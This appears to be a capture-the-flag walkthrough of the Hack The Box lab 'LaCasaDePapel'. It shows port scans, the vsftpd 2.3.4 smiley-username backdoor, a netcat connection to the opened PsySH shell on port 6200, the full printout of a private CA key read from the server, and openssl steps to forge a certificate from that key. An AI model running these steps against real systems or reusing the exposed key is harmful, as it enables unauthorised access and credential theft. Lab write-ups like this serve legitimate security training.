### Ping
```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/LaCasaDePapel]
└─$ ping -c 4 10.10.10.131
PING 10.10.10.131 (10.10.10.131) 56(84) bytes of data.
64 bytes from 10.10.10.131: icmp_seq=1 ttl=63 time=191 ms
64 bytes from 10.10.10.131: icmp_seq=2 ttl=63 time=203 ms
64 bytes from 10.10.10.131: icmp_seq=3 ttl=63 time=188 ms
64 bytes from 10.10.10.131: icmp_seq=4 ttl=63 time=191 ms

--- 10.10.10.131 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 187.901/193.082/202.834/5.753 ms

```

TTL = 63 = Linux

#### Nmap
```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/LaCasaDePapel]
└─$ nmap 10.10.10.131
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 06:34 EDT
Nmap scan report for 10.10.10.131 (10.10.10.131)
Host is up (0.20s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

##### Todos los puertos
```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/LaCasaDePapel]
└─$ nmap 10.10.10.131 -p- --min-rate=1000 -T5 -Pn -n
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 06:36 EDT
Warning: 10.10.10.131 giving up on port because retransmission cap hit (2).
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 77.13% done; ETC: 06:37 (0:00:19 remaining)
Nmap scan report for 10.10.10.131
Host is up (0.19s latency).
Not shown: 63807 closed tcp ports (conn-refused), 1724 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https   
```

```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/LaCasaDePapel]
└─$ nmap 10.10.10.131 -p21,22,80,443 -sCV                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 06:38 EDT
Nmap scan report for 10.10.10.131 (10.10.10.131)
Host is up (0.19s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|   http/1.1
|_  http/1.0
| tls-alpn: 
|_  http/1.1
Service Info: OS: Unix
```


## Port 21 - vsftpd 2.3.4

https://www.exploit-db.com/exploits/49757

```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/LaCasaDePapel]
└─$ ftp 10.10.10.131
Connected to 10.10.10.131.
220 (vsFTPd 2.3.4)
Name (10.10.10.131:pelado): pela:) 
331 Please specify the password.
Password: 

421 Service not available, remote server timed out. Connection closed.
ftp: Login failed
ftp> 
```

```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/LaCasaDePapel]
└─$ nc 10.10.10.131 6200                          
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman

```

https://psysh.org/

#### How execute commands there?

https://stackoverflow.com/questions/56910401/how-to-execute-system-commands-using-psysh-php

```js
scandir("/home/nairobi")
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
echo file_get_contents("/home/nairobi/ca.key")
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----

```

Primero, debemos entender el concepto de **par de clave privada/clave pública** :
El cifrado mediante un par de clave privada/clave pública garantiza que los datos puedan cifrarse con una clave y descifrarse _únicamente_ con la otra clave del par. Las claves son de naturaleza similar y se pueden usar alternativamente: lo que una clave cifra, la otra se puede usar para descifrar. Las claves se generan con algoritmos que utilizan números primos y su longitud de bits determina la dificultad de descifrar los datos sin las claves. El truco con un par de claves consiste en mantener una clave en secreto (la clave privada) y distribuir la otra (la clave pública) a todos. Cualquiera puede enviarte un mensaje cifrado que sólo tú podrás descifrar. Sólo tú tienes la otra llave del par, ¿verdad? En el caso contrario, puedes certificar que un mensaje proviene sólo de ti, porque eres tú quien lo ha cifrado con tu clave privada, y sólo la clave pública asociada lo descifrará correctamente. ¡Cuidado, en este caso el mensaje no está seguro: solo lo has _firmado_ efectivamente , ya que la clave pública está disponible para todos!

Mas info: https://stackoverflow.com/questions/18843466/whats-a-client-certificate-and-where-to-get-it-how-to-use-it-to-connect-to-ser

For authenticate with 443 https in with Express web server:
https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326
https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs

```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/LaCasaDePapel]
└─$ openssl req -x509 -new -nodes -key ca.key -sha256 -days 500 -out p314.pem 
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

